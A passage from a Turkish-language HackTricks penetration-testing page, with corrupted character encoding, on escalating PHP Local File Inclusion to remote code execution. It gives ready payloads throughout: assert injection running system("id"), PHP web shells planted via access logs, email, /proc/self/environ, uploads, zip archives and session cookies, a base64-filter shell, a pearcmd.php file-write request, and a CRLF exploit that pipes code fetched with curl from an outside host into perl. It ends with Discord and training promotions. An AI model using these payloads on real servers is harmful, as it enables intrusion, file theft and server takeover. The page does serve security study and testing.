{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

**php filtrelerini destekleyen herhangi bir dosyanÄ±n okunmasÄ±nÄ±** kÃ¶tÃ¼ye kullanarak RCE elde etmek mÃ¼mkÃ¼ndÃ¼. AyrÄ±ntÄ±lÄ± aÃ§Ä±klama [**bu yazÄ±da bulunabilir**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Ã‡ok hÄ±zlÄ± Ã¶zet: PHP yÄ±ÄŸÄ±nÄ±nda bir **3 bayt taÅŸmasÄ±** kÃ¶tÃ¼ye kullanÄ±larak **belirli boyuttaki serbest parÃ§alarÄ±n zinciri** deÄŸiÅŸtirildi ve bÃ¶ylece **herhangi bir adrese yazma** imkanÄ± saÄŸlandÄ±, bu nedenle **`system`** Ã§aÄŸrÄ±sÄ± yapmak iÃ§in bir hook eklendi.\
Daha fazla php filtresi kÃ¶tÃ¼ye kullanÄ±larak belirli boyutlarda parÃ§alar tahsis etmek mÃ¼mkÃ¼ndÃ¼.

### Daha Fazla Protokol

Burada dahil edilebilecek daha fazla [**protokolÃ¼ kontrol edin**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” BelleÄŸe veya geÃ§ici bir dosyaya yazma (bu dosya dahil etme saldÄ±rÄ±sÄ±nda nasÄ±l faydalÄ± olabileceÄŸinden emin deÄŸilim)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” Yerel dosya sistemine eriÅŸim
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URL'lerine eriÅŸim
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URL'lerine eriÅŸim
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” SÄ±kÄ±ÅŸtÄ±rma AkÄ±ÅŸlarÄ±
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” Desene uyan yol adlarÄ±nÄ± bulma (HiÃ§bir ÅŸey yazdÄ±rmadÄ±ÄŸÄ± iÃ§in burada pek faydalÄ± deÄŸil)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” GÃ¼venli Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Ses akÄ±ÅŸlarÄ± (Rastgele dosyalarÄ± okumak iÃ§in faydalÄ± deÄŸil)

## PHP'nin 'assert' ile LFI

PHP'deki Local File Inclusion (LFI) riskleri, dizeler iÃ§inde kod Ã§alÄ±ÅŸtÄ±rabilen 'assert' fonksiyonu ile Ã§alÄ±ÅŸÄ±rken oldukÃ§a yÃ¼ksektir. Bu, ".." gibi dizin geÃ§iÅŸ karakterleri iÃ§eren giriÅŸlerin kontrol edilmesi ancak dÃ¼zgÃ¼n bir ÅŸekilde temizlenmemesi durumunda Ã¶zellikle sorunludur.

Ã–rneÄŸin, PHP kodu dizin geÃ§iÅŸini Ã¶nlemek iÃ§in ÅŸu ÅŸekilde tasarlanmÄ±ÅŸ olabilir:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, geÃ§iÅŸi durdurmayÄ± amaÃ§lasa da, istemeden kod enjeksiyonu iÃ§in bir vektÃ¶r oluÅŸturur. Dosya iÃ§eriÄŸini okumak iÃ§in bunu istismar etmek isteyen bir saldÄ±rgan ÅŸunlarÄ± kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer ÅŸekilde, rastgele sistem komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in ÅŸunlar kullanÄ±labilir:
```plaintext
' and die(system("id")) or '
```
**Bu yÃ¼kleri URL-encode etmek Ã¶nemlidir.**

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve kritik platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy) Ã¼zerinden bize katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## PHP Blind Path Traversal

{% hint style="warning" %}
Bu teknik, bir **PHP fonksiyonu** tarafÄ±ndan **bir dosyaya eriÅŸim** saÄŸladÄ±ÄŸÄ±nÄ±z ancak dosyanÄ±n iÃ§eriÄŸini gÃ¶remediÄŸiniz (Ã¶rneÄŸin, **`file()`** fonksiyonuna basit bir Ã§aÄŸrÄ± gibi) durumlarda geÃ§erlidir.
{% endhint %}

[**bu muhteÅŸem yazÄ±da**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) bir blind path traversal'Ä±n PHP filtresi aracÄ±lÄ±ÄŸÄ±yla **bir hata oracle'Ä± Ã¼zerinden bir dosyanÄ±n iÃ§eriÄŸini dÄ±ÅŸarÄ± sÄ±zdÄ±rmak iÃ§in nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸi** aÃ§Ä±klanmaktadÄ±r.

Ã–zetle, teknik, bir dosyanÄ±n iÃ§eriÄŸini o kadar **bÃ¼yÃ¼k** yapmak iÃ§in **"UCS-4LE" kodlamasÄ±nÄ±** kullanmaktadÄ±r ki, dosyayÄ± aÃ§an **PHP fonksiyonu** bir **hata** tetikleyecektir.

Daha sonra, ilk karakteri sÄ±zdÄ±rmak iÃ§in filtre **`dechunk`** kullanÄ±lÄ±r ve diÄŸerleriyle birlikte **base64** veya **rot13** gibi filtreler kullanÄ±lÄ±r ve nihayetinde filtreler **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** kullanÄ±larak **diÄŸer karakterler baÅŸa yerleÅŸtirilir ve sÄ±zdÄ±rÄ±lÄ±r**.

**ZayÄ±f olabilecek fonksiyonlar**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (sadece hedefi yalnÄ±zca bu ile okuyun)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar iÃ§in belirtilen yazÄ±ya bakÄ±n!

## LFI2RCE

### Uzak Dosya Dahil Etme

Daha Ã¶nce aÃ§Ä±klandÄ±ÄŸÄ± gibi, [**bu baÄŸlantÄ±yÄ± takip edin**](./#remote-file-inclusion).

### Apache/Nginx log dosyasÄ± aracÄ±lÄ±ÄŸÄ±yla

EÄŸer Apache veya Nginx sunucusu **LFI'ye karÅŸÄ± zayÄ±fsa**, dahil etme fonksiyonu iÃ§inde **`/var/log/apache2/access.log` veya `/var/log/nginx/access.log`** dosyasÄ±na eriÅŸmeye Ã§alÄ±ÅŸabilirsiniz, **kullanÄ±cÄ± ajanÄ±** iÃ§inde veya bir **GET parametresi** iÃ§inde **`<?php system($_GET['c']); ?>`** gibi bir php shell ayarlayÄ±p o dosyayÄ± dahil edin.

{% hint style="warning" %}
Shell iÃ§in **Ã§ift tÄ±rnak** kullanÄ±yorsanÄ±z, **basit tÄ±rnaklar** yerine, Ã§ift tÄ±rnaklar "_**quote;**_" dizesi iÃ§in deÄŸiÅŸtirilecektir, **PHP burada bir hata verecektir** ve **baÅŸka hiÃ§bir ÅŸey Ã§alÄ±ÅŸtÄ±rÄ±lmayacaktÄ±r**.

AyrÄ±ca, **yÃ¼kÃ¼ doÄŸru yazdÄ±ÄŸÄ±nÄ±zdan emin olun** yoksa PHP, log dosyasÄ±nÄ± yÃ¼klemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda her seferinde hata verecek ve ikinci bir fÄ±rsatÄ±nÄ±z olmayacaktÄ±r.
{% endhint %}

Bu, diÄŸer loglarda da yapÄ±labilir ancak **dikkatli olun**, loglardaki kod URL encoded olabilir ve bu Shell'i bozabilir. **Authorization "basic"** baÅŸlÄ±ÄŸÄ±, Base64'te "user:password" iÃ§erir ve loglar iÃ§inde Ã§Ã¶zÃ¼lÃ¼r. PHPShell bu baÅŸlÄ±k iÃ§ine yerleÅŸtirilebilir.\
DiÄŸer olasÄ± log yollarÄ±:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing kelime listesi: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta ile

**Bir e-posta gÃ¶nderin** iÃ§ hesap (user@localhost) iÃ§eren PHP yÃ¼klemeniz gibi `<?php echo system($_REQUEST["cmd"]); ?>` ve kullanÄ±cÄ± e-postasÄ±na dahil etmeye Ã§alÄ±ÅŸÄ±n bir yol ile **`/var/mail/<USERNAME>`** veya **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* Ã¼zerinden

1. BirÃ§ok shell yÃ¼kleyin (Ã¶rneÄŸin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) dahil edin, $PID = sÃ¼recin PID'si (brute force ile bulunabilir) ve $FD dosya tanÄ±mlayÄ±cÄ±sÄ± (brute force ile de bulunabilir)

### /proc/self/environ Ã¼zerinden

Bir log dosyasÄ± gibi, yÃ¼klemeyi User-Agent iÃ§inde gÃ¶nderin, /proc/self/environ dosyasÄ± iÃ§inde yansÄ±tÄ±lacaktÄ±r.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

EÄŸer bir dosya yÃ¼kleyebiliyorsanÄ±z, sadece shell yÃ¼kÃ¼nÃ¼ iÃ§ine enjekte edin (Ã¶rneÄŸin: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
DosyanÄ±n okunabilirliÄŸini korumak iÃ§in, resimlerin/doc/pdf'nin meta verilerine enjekte etmek en iyisidir.

### Zip dosyasÄ± yÃ¼kleme yoluyla

SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ bir PHP shell iÃ§eren bir ZIP dosyasÄ± yÃ¼kleyin ve eriÅŸin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP oturumlarÄ±

Web sitesinin PHP Oturumu (PHPSESSID) kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol edin.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarÄ±nda saklanÄ±r.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI'yi PHP oturum dosyasÄ±nÄ± dahil etmek iÃ§in kullanÄ±n
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

EÄŸer ssh aktifse, hangi kullanÄ±cÄ±nÄ±n kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id\_rsa**'ya eriÅŸmeye Ã§alÄ±ÅŸÄ±n.

### **Via** **vsftpd** _**logs**_

FTP sunucusu vsftpd iÃ§in loglar _**/var/log/vsftpd.log**_ konumundadÄ±r. Yerel Dosya Dahil Etme (LFI) aÃ§Ä±ÄŸÄ± mevcutsa ve maruz kalmÄ±ÅŸ bir vsftpd sunucusuna eriÅŸim mÃ¼mkÃ¼nse, aÅŸaÄŸÄ±daki adÄ±mlar dikkate alÄ±nabilir:

1. GiriÅŸ sÃ¼recinde kullanÄ±cÄ± adÄ± alanÄ±na bir PHP yÃ¼kÃ¼ enjekte edin.
2. Enjeksiyondan sonra, LFI'yi kullanarak sunucu loglarÄ±nÄ± _**/var/log/vsftpd.log**_ konumundan alÄ±n.

### Via php base64 filter (using base64)

[Bu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makalede gÃ¶sterildiÄŸi gibi, PHP base64 filtresi sadece Non-base64'Ã¼ yok sayar. Bunu dosya uzantÄ±sÄ± kontrolÃ¼nÃ¼ atlamak iÃ§in kullanabilirsiniz: eÄŸer ".php" ile biten base64 saÄŸlarsanÄ±z, "."'yu yok sayar ve "php" ekler. Ä°ÅŸte bir Ã¶rnek yÃ¼k:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Bu [**yazÄ±**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), **php filtrelerini kullanarak rastgele iÃ§erik** oluÅŸturabileceÄŸinizi aÃ§Ä±klar. Bu, temelde **bir dosyaya yazmadan** dahil etmek iÃ§in **rastgele php kodu** oluÅŸturabileceÄŸiniz anlamÄ±na gelir.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**GeÃ§ici** olarak `/tmp` dizinine kaydedilecek bir dosya **yÃ¼kleyin**, ardÄ±ndan **aynÄ± istekte** bir **segmentation fault** tetikleyin, ve ardÄ±ndan **geÃ§ici dosya silinmeyecek** ve onu arayabilirsiniz.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

EÄŸer bir **Local File Inclusion** bulduysanÄ±z ve **Nginx** PHP'nin Ã¶nÃ¼nde Ã§alÄ±ÅŸÄ±yorsa, aÅŸaÄŸÄ±daki teknikle RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

EÄŸer bir **Local File Inclusion** bulduysanÄ±z, **oturumunuz olmasa bile** ve `session.auto_start` `KapalÄ±` ise. **`PHP_SESSION_UPLOAD_PROGRESS`**'i **multipart POST** verilerinde saÄŸlarsanÄ±z, PHP sizin iÃ§in **oturumu etkinleÅŸtirecektir**. Bunu RCE elde etmek iÃ§in kÃ¶tÃ¼ye kullanabilirsiniz:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

EÄŸer bir **Local File Inclusion** bulduysanÄ±z ve sunucu **Windows** Ã¼zerinde Ã§alÄ±ÅŸÄ±yorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

[**bu yazÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), `/usr/local/lib/phppearcmd.php` dosyasÄ± php docker gÃ¶rÃ¼ntÃ¼lerinde varsayÄ±lan olarak mevcuttur. AyrÄ±ca, bir URL parametresi `=` iÃ§ermiyorsa, bunun bir argÃ¼man olarak kullanÄ±lacaÄŸÄ± belirtilmiÅŸtir.

AÅŸaÄŸÄ±daki istek, `/tmp/hello.php` dizininde `<?=phpinfo()?>` iÃ§eriÄŸi ile bir dosya oluÅŸturur:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

AÅŸaÄŸÄ±daki, RCE elde etmek iÃ§in bir CRLF aÃ§Ä±ÄŸÄ±nÄ± istismar eder ( [**buradan**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() Ãœzerinden (file\_uploads = on)

EÄŸer bir **Local File Inclusion** bulduysanÄ±z ve **phpinfo()**'u gÃ¶steren bir dosya ile file\_uploads = on bulduysanÄ±z RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure Ãœzerinden

EÄŸer bir **Local File Inclusion** bulduysanÄ±z ve **geÃ§ici dosyanÄ±n yolunu dÄ±ÅŸarÄ± aktarabiliyorsanÄ±z** AMA **sunucu** **dahil edilecek dosyanÄ±n PHP iÅŸaretlerine sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol ediyorsa**, bu **Race Condition** ile **o kontrolÃ¼ atlamayÄ±** deneyebilirsiniz:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Sonsuz Bekleme + Brute Force Ãœzerinden

EÄŸer LFI'yi **geÃ§ici dosyalar yÃ¼klemek** iÃ§in kÃ¶tÃ¼ye kullanabiliyorsanÄ±z ve sunucunun PHP yÃ¼rÃ¼tmesini **dondurmasÄ±nÄ±** saÄŸlayabiliyorsanÄ±z, o zaman **geÃ§ici dosyayÄ± bulmak iÃ§in saatlerce dosya adlarÄ±nÄ± brute force** yapabilirsiniz:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Fatal Error'a

EÄŸer `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarÄ±ndan herhangi birini dahil ederseniz. (Bu hatayÄ± fÄ±rlatmak iÃ§in aynÄ± dosyayÄ± 2 kez dahil etmeniz gerekir).

**Bunun nasÄ±l faydalÄ± olduÄŸunu bilmiyorum ama belki de faydalÄ±dÄ±r.**\
_Hatta bir PHP Fatal Error'a neden olsanÄ±z bile, yÃ¼klenen PHP geÃ§ici dosyalarÄ± silinir._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
